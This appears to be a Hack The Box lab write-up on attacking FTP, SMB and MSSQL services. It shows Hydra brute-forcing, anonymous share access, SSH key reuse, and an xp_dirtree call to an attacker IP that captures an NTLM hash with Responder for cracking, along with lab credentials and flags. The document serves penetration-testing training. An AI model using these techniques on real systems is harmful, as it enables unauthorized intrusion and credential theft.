# Attacking Common Services — Part 1  
## FTP, SMB and SQL Databases

This section focused on attacking common network services that are frequently exposed in real-world environments. The objective was to:
- Enumerate services
- Identify weak configurations
- Obtain valid credentials
- Escalate access
- Retrieve flags

The services covered were:
- FTP
- SMB
- MSSQL

# FTP Enumeration and Exploitation

The first target exposed an FTP service. The goal was to enumerate the service, identify valid credentials, and retrieve the flag.

---

## FTP Enumeration

The first step was running an Nmap scan:

```bash
nmap -sC -sV 10.129.203.6
```

### Understanding the Flags

| Flag | Purpose |
|---|---|
| `-sC` | Runs default NSE scripts |
| `-sV` | Performs version detection |

The scan revealed:

```text
2121/tcp open ftp
```

Although FTP usually runs on:
```text
Port 21
```

this service was configured on:
```text
Port 2121
```

Using non-standard ports is common in labs and real environments to avoid simple detection.

---

## Anonymous FTP Access

The Nmap output also revealed:

```text
ftp-anon: Anonymous FTP login allowed
```

This meant the server allowed unauthenticated access.

Connection was established manually:

```bash
ftp 10.129.203.6 2121
```

Login:

```text
Username: anonymous
Password: blank
```

After listing files:

```bash
ls
```

two important files were discovered:

```text
passwords.list
users.list
```

These files were downloaded using:

```bash
get users.list
get passwords.list
```

---

## Enumerating Usernames

Viewing:
```text
users.list
```

revealed multiple usernames:

```text
root
robin
admin
administrator
```

The valid FTP user identified was:

```text
robin
```

---

## Brute Forcing FTP Credentials

Hydra was used to brute-force the password:

```bash
hydra -l robin -P passwords.list ftp://10.129.203.6:2121
```

### Command Breakdown

| Option | Purpose |
|---|---|
| `-l robin` | Target username |
| `-P passwords.list` | Password wordlist |
| `ftp://` | FTP service target |

Hydra successfully returned:

```text
login: robin
password: 7iz4rnckjsduza7
```

---

## Retrieving the Flag

Using the discovered credentials:

```bash
ftp 10.129.203.6 2121
```

After login:

```bash
ls
```

revealed:

```text
flag.txt
```

The file was downloaded:

```bash
get flag.txt
```

and viewed:

```bash
cat flag.txt
```

Flag:

```text
HTB{ATT4CK1NG_F7P_53RV1C3}
```

---

# Key Lessons from FTP

- FTP may run on non-standard ports
- Anonymous access can expose sensitive files
- Publicly accessible credential lists are dangerous
- Weak password reuse enables brute-force attacks
- Small misconfigurations can quickly lead to compromise

# SMB Enumeration and Exploitation

The next target involved SMB enumeration and exploitation.

The objective was to:
- Enumerate SMB shares
- Identify credentials
- Gain SSH access
- Retrieve the flag

---

## Enumerating SMB Shares

Shares were enumerated using:

```bash
smbclient -N -L //10.129.203.6
```

### Understanding the Command

| Option | Purpose |
|---|---|
| `-N` | Null session (anonymous login) |
| `-L` | List available shares |

The output revealed:

```text
print$
GGJ
IPC$
```

---

## Checking Share Permissions

Permissions were verified using:

```bash
smbmap -H 10.129.203.6
```

Output:

```text
GGJ    READ ONLY
```

This confirmed:
```text
GGJ
```

was the readable share.

---

## Accessing the SMB Share

Anonymous access was attempted:

```bash
smbclient -N //10.129.203.6/GGJ
```

Inside the share:

```text
id_rsa
```

was discovered.

However, downloading failed:

```bash
get id_rsa
```

Error:

```text
NT_STATUS_ACCESS_DENIED
```

---

# Understanding the Issue

Although:
```text
Share permissions allowed access
```

the actual file permissions restricted anonymous users.

This demonstrated an important concept:

```text
Share-level permissions and file-level permissions are different
```

---

# Credential Discovery

The username:
```text
jason
```

was identified from the challenge context.

Various attacks were attempted:
- Password spraying
- Testing weak passwords
- Reusing FTP wordlists

Eventually valid credentials were found:

```text
34c8zuNBo91!@28Bszh
```

---

# Accessing the Share Authenticated

Using the credentials:

```bash
smbclient --user jason //10.129.203.6/GGJ
```

This time:
```text
id_rsa
```

was downloaded successfully.

---

# SSH Access Using the Private Key

SSH login attempt:

```bash
ssh -i id_rsa jason@10.129.203.6
```

returned:

```text
WARNING: UNPROTECTED PRIVATE KEY FILE!
```

SSH refused to use the key because the permissions were too open.

---

# Fixing SSH Key Permissions

Permissions were corrected:

```bash
chmod 600 id_rsa
```

### Why This Matters

SSH requires private keys to be:
```text
Readable only by the owner
```

Otherwise SSH considers the key insecure.

---

# Successful SSH Login

After fixing permissions:

```bash
ssh -i id_rsa jason@10.129.203.6
```

Login succeeded.

Verification:

```bash
whoami
```

returned:

```text
jason
```

---

# Retrieving the SMB Flag

```bash
cat flag.txt
```

Flag:

```text
HTB{SMB_4TT4CKS_2349872359}
```

---

# Key Lessons from SMB

- READ ONLY shares may still restrict file access
- File-level permissions matter
- Password spraying remains effective
- Credential reuse is dangerous
- SSH private keys require strict permissions

# Attacking SQL Databases (MSSQL)

The final section focused on:
```text
MSSQL exploitation and privilege escalation
```

Objectives:
- Authenticate to MSSQL
- Enumerate privileges
- Capture NTLM hashes
- Crack credentials
- Access restricted databases

---

# Initial MSSQL Access

Authentication was performed using:

```bash
mssqlclient.py htbdbuser@10.129.203.12 -windows-auth
```

---

# Checking Privileges

Queries executed:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Results:

```text
User: htbdbuser
Sysadmin: 0
```

This confirmed:
```text
No sysadmin privileges
```

---

# Attempting Privilege Escalation

Impersonation rights were checked:

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

No results were returned.

This meant:
```text
No direct impersonation path existed
```

---

# Enumerating Linked Servers

Linked servers were identified using:

```sql
SELECT srvname, isremote FROM sysservers;
```

A linked server existed:

```text
WINSRV02\SQLEXPRESS
```

However, attempts to query it failed due to:
```text
Connection timeout
```

This ruled out lateral movement through linked servers.

---

# Capturing NTLM Hashes with xp_dirtree

The next technique involved abusing:

```text
xp_dirtree
```

to force the SQL Server service account to authenticate to the attacker's machine.

Responder was started:

```bash
sudo responder -I tun0
```

Inside MSSQL:

```sql
EXEC master..xp_dirtree '\\10.10.14.250\share\';
```

This forced SMB authentication to the attack machine.

Responder captured the:
```text
NetNTLMv2 hash
```

for:

```text
WIN-02\mssqlsvc
```

---

# Cracking the Hash

Hashcat was used:

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

### Understanding the Mode

| Mode | Purpose |
|---|---|
| `5600` | NetNTLMv2 hash cracking |

The password cracked successfully:

```text
princess1
```

---

# Logging in as mssqlsvc

```bash
mssqlclient.py mssqlsvc@10.129.203.12 -windows-auth
```

Password:

```text
princess1
```

---

# Verifying Sysadmin Access

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Result:

```text
1
```

This confirmed:
```text
Sysadmin privileges
```

---

# Accessing the Restricted Database

```sql
USE flagDB;
```

Tables were enumerated:

```sql
SELECT name FROM sys.tables;
```

Then data was extracted:

```sql
SELECT * FROM tb_flag;
```

---

# Final MSSQL Flag

```text
HTB{!l0v3#4$#!n9_4nd_r3$p0nd3r}
```

---

# Key Lessons from MSSQL Exploitation

- Lack of sysadmin access does not mean exploitation is impossible
- Linked servers can provide lateral movement opportunities
- xp_dirtree can leak NTLM hashes
- Responder is highly effective for capturing hashes
- Service accounts frequently use weak passwords
- Hash cracking remains a practical privilege escalation method
- Small misconfigurations often lead to full compromise

---

# Overall Takeaways

This section demonstrated how:
- Weak credentials
- Misconfigured services
- Anonymous access
- Credential reuse
- Poor privilege separation

can lead to complete compromise of:
- FTP services
- SMB shares
- MSSQL servers

The attacks relied heavily on:
- Enumeration
- Wordlists
- Brute forcing
- Credential reuse
- Privilege escalation techniques

These are extremely common attack paths during:
- Real-world penetration tests
- Internal assessments
- Red team engagements
